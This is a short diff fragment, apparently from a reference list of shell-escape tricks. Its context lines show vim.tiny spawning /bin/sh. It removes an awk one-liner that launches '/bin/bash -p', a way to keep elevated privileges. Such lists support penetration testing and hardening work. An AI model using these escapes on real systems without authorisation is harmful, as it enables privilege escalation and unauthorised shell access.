@@ -17,4 +17,3 @@ vim.tiny
 :set shell=/bin/sh
 :shell
 ```
-awk 'BEGIN {system("/bin/bash -p")}
